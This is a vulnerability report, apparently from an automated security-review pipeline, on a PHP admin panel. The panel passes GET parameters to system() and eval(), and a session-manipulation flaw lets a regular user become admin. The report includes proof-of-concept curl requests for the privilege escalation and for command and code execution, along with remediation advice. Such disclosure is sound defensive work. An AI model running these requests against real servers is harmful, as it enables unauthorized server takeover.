# Vulnerability: Command Code Injection — Admin Panel Remote Execution

## Summary
The admin panel at `/s3cretadm1n/index.php` is vulnerable to remote code execution through direct use of unsanitized user input in `system()` and `eval()` functions. Any authenticated admin can execute arbitrary code on the server.

## Confidence
High
(Found by both Sink→Source and Source→Sink taint analysis with fully cited path and survived all 3 adversarial attacks.)

## Authentication Requirement
Regular user followed by privilege escalation (not initially admin)
- First requires a regular user session (created through normal registration and login)
- Then exploits session manipulation vulnerability in save_session.php to gain admin privileges
- Finally uses admin privileges to access the secure endpoint

## Attack Surface Location
- **Endpoint:** `GET /s3cretadm1n/index.php`
- **Handler:** `system()` at s3cretadm1n/index.php:19, `eval()` at s3cretadm1n/index.php:22
- **Framework protections bypassed:** AumWAF provides no protection against this pattern

## Attack Chain
1. Initial access: Attacker registers as a regular user, then exploits the session manipulation in save_session.php with debug=true to set admin=1 in the session
2. Endpoint interaction: Attacker accesses the admin panel at /s3cretadm1n/index.php with the newly acquired admin privileges
3. Malicious input: Attacker provides malicious command in the 'c' parameter or malicious PHP code in the 'p' parameter
4. Sink execution: The application directly passes user input to system() and eval() functions without any sanitization
5. Post-exploitation: Attacker executes arbitrary system commands or PHP code on the server
6. Final impact: Full system compromise - attacker can read/modify files, access database, set up persistence

## Data Flow
- **Source (user input):** Direct from GET parameter 'c' or 'p'
- **Sink:** `system(get('c'))` at s3cretadm1n/index.php:19 and `eval(get('p'))` at s3cretadm1n/index.php:22

```
GET parameter 'c' → get('c') → system() [s3cretadm1n/index.php:19]
GET parameter 'p' → get('p') → eval() [s3cretadm1n/index.php:22]
```

## Proof of Concept

### Prerequisites
- Any valid user session (created through normal registration and login)
- Access to set arbitrary session variables through save_session.php

### Exploit Request
```bash
# Step 1: Gain admin privileges by manipulating sessions with debug mode
curl "http://example.com/save_session.php?debug=true&admin=1&auth=1"

# Step 2: Execute system commands as admin
curl -b "PHPSESSID=<cookie-from-step-1>" "http://example.com/s3cretadm1n/index.php?c=id"

# Step 3: Execute arbitrary PHP code as admin
curl -b "PHPSESSID=<cookie-from-step-1>" "http://example.com/s3cretadm1n/index.php?p=system('whoami')"
```

### Expected Vulnerable Response
For Step 1 (admin privilege escalation):
```http
HTTP/1.1 200 OK
Content-Type: text/plain

Array
(
    [admin] => 1
    [auth] => 1
)
```

For Step 2 (command execution):
```http
HTTP/1.1 200 OK
Content-Type: text/plain

This is secret admin page, there are nothing here but gold.

Available Parameter:
./index.php?c=
./index.php?p=

Output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Expected Patched Response
```http
HTTP/1.1 403 Forbidden
Content-Type: text/html

Access denied
```

### Impact Demonstration
An attacker can escalate from regular user to admin, then execute any system command, read/write any file accessible by the web server user, and potentially escalate privileges. The vulnerability combines an authentication bypass (session manipulation) with remote code execution.

## Affected Code
```php
// s3cretadm1n/index.php:19
system(get('c'));

// s3cretadm1n/index.php:22
eval(get('p'));
```

## Adversarial Review
Independent reviewer: `security_reviewer_adversary` (did not author this finding).

- **Reachability attack — FAILED to kill.** The endpoint is reachable from external network at /s3cretadm1n/index.php with the proper admin authentication. The authentication is checked at s3cretadm1n/index.php:4-6 with `isAdmin()` which checks if the `admin` session variable is set.
- **Impact attack — FAILED to kill.** Direct code execution via system() and eval() allows complete server compromise, which is clearly Remote Code Execution - in the vulnerability scope. The code snippets at s3cretadm1n/index.php:19-22 clearly show unsanitized input passed to dangerous functions.
- **Validity attack — FAILED to kill.** There is no input sanitization or framework protection. The get() function simply returns the HTTP parameter value, and it's passed directly to system() and eval(). The WAF in AumWAF.class.php only checks for specific scanner signatures but not for command injection.

**Verdict: SURVIVED** (all three attacks failed).

## Remediation
1. Remove or never expose such an admin panel to the public
2. If needed, implement strict allowlist validation for any commands that might be executed
3. Use escapeshellarg() and escapeshellcmd() if system commands are absolutely necessary
4. Avoid call to eval() at all costs - there is rarely a legitimate reason for it in web applications
5. Implement additional administrative controls like IP whitelisting